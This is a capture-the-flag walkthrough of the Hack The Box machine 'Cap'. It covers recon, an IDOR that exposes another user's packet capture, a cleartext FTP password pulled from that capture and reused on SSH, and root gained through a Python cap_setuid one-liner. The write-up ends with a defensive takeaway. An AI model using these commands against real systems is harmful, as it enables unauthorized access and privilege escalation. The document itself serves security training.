# Cap — Hack The Box, Easy, Linux

**TL;DR:** An unauthenticated dashboard lets anyone run a packet capture and,
through an IDOR on the capture ID, download somebody else's. That capture holds
a cleartext FTP login, the password is reused on SSH, and the system Python
interpreter carries `cap_setuid` — so the shell you land in is one line away
from root.

## Reconnaissance

Three ports, which is a small enough surface that the path is almost certainly
in one of them:

    nmap -Pn -sCV -p21,22,80 10.129.x.x

    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
    80/tcp open  http    Gunicorn
    |_http-title: Security Dashboard

A full `-p-` sweep found nothing beyond these. Two observations set the
direction. First, vsftpd 3.0.3 is current and patched — the famous 2.3.4
backdoor does not apply, so FTP is probably a destination rather than an entry
point. Second, `Gunicorn` means a Python WSGI app, which usually means a small
hand-written Flask application rather than a hardened CMS. Small hand-written
apps are where authorization bugs live.

## Enumeration

Rather than fuzzing directories immediately, I read the page. The sidebar gave
me the whole application in one grep:

    grep -oE 'href="[^"]+"' index.html | grep -v static

    /capture
    /ip
    /netstat

`/ip` and `/netstat` render `ifconfig` and `netstat` output. `/capture` is
described in the nav as "Security Snapshot (5 Second PCAP + Analysis)" — the
web app runs tcpdump on the host and shows you the result. There is no login
anywhere; all of this is anonymous.

The interesting part is the redirect:

    curl -si http://10.129.x.x/capture

    HTTP/1.1 302 FOUND
    Location: http://10.129.x.x/data/1

The capture I just triggered became `/data/1`. A sequential integer identifying
a per-user artifact is the textbook shape of an IDOR, and the question answers
itself in one request: does `/data/0` exist, and is it mine?

## Foothold

    curl -s http://10.129.x.x/data/0 | grep -iE 'download|user-name'

    <h4 class="user-name">Nathan</h4>
    <button onclick="location.href='/download/0'">Download</button>

`/data/0` exists, I never created it, and the page attributes it to Nathan. The
handler resolves the ID straight to a stored capture with no ownership check.
Capture 0 is the first one ever taken on the box, which in practice means it was
taken by whoever set the machine up — the most interesting capture on the host
is also the most predictable ID.

    curl -OJ http://10.129.x.x/download/0
    file 0.pcap
    # pcap capture file, microsecond ts (little-endian) - version 2.4

No tshark in my container, so tcpdump with `-A` was enough to read the
application-layer bytes:

    tcpdump -r 0.pcap -A -nn | grep -iE 'USER |PASS |230 '

    FTP: USER nathan
    FTP: PASS Buck3tH4TF0RM3!
    FTP: 230 Login successful.

That is the whole point of the chain: FTP authenticates in the clear, so a
capture of an FTP login *is* a credential. The IDOR did not leak a file — it
leaked a password.

The credential is for FTP, but the reflex is always to try it everywhere:

    sshpass -p 'Buck3tH4TF0RM3!' ssh nathan@10.129.x.x id
    uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)

Reuse. Shell:

    nathan@cap:~$ cat user.txt
    <user flag redacted>

## Privilege escalation

`sudo -l` wants a password I do not have, so that door is closed. The next
check is the one that pays here:

    getcap -r / 2>/dev/null

    /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
    /usr/bin/ping = cap_net_raw+ep

`cap_net_bind_service` on the interpreter makes sense in isolation — someone
wanted the dashboard to bind a low port without running the whole thing as
root, which is exactly the instinct capabilities exist to serve. But it was
granted alongside `cap_setuid`, and `cap_setuid` on a *shared* interpreter is
not a narrowing of root privilege, it is a redistribution of it. Every script
any user runs inherits the ability to change UID:

    nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    root@cap:~# id
    uid=0(root) gid=1001(nathan) groups=1001(nathan)
    root@cap:~# cat /root/root.txt
    <root flag redacted>

Note the `gid` stays 1001 — `setuid` changes the user, not the group. It does
not matter for reading `/root/root.txt`, but it is a useful tell in a shell:
`uid=0` with a non-zero gid usually means you got there through a capability or
a SUID binary rather than a real login.

## What did not work

**vsftpd 3.0.3 exploits.** The first instinct on seeing FTP is to check for the
2.3.4 backdoor or an anonymous login. 3.0.3 is patched and anonymous access was
disabled. Parked after two minutes; FTP turned out to be the *source* of the
credential, not a way in.

**Directory fuzzing.** I did not need it, and starting there would have been
slower. Everything the app exposes was linked from the sidebar of the landing
page. A fuzzer would have found `/data/` eventually, but reading the HTML found
it in ten seconds and gave me the semantics too — a fuzzer would tell me the
path exists, not that the ID is sequential and per-user.

**pkexec.** The SUID list includes `/usr/bin/pkexec`, and on an Ubuntu 20.04
box of this vintage PwnKit (CVE-2021-4034) is plausible. I did not test it: the
capability path was already confirmed, is deterministic, and does not risk
destabilising the target. Worth remembering as a fallback, not a first choice.

## Lessons

A sequential integer in a URL that addresses per-user data is worth one request
before anything else. `/data/0` cost ten seconds and skipped every other phase
of the engagement.

Any cleartext protocol reachable from a capture capability is a credential
store. Treat "can download a pcap" as equivalent to "can read passwords",
because for FTP, Telnet, HTTP basic auth and unencrypted SMTP it literally is.

Run `getcap -r /` before reaching for linpeas. It is one command, it produces
five lines instead of a thousand, and on a modern Linux box capabilities are a
more common escalation path than SUID binaries.

## Defensive takeaway

The chain has five links, but only one of them turns a foothold into a total
compromise: `cap_setuid` on a shared interpreter. Everything upstream is
ordinary application sloppiness that costs a low-privilege shell; the capability
is what makes *any* future foothold — this bug or the next one — equal to root.

The cheapest fix, though, is upstream: an ownership check on `/data/<id>` is
three lines and severs the chain before a credential ever leaves the host. That
is the recurring shape of these boxes. The step that lets an attacker in and the
step that makes it fatal are rarely the same step, and the one worth fixing
first is usually neither the newest CVE nor the last link in the chain.
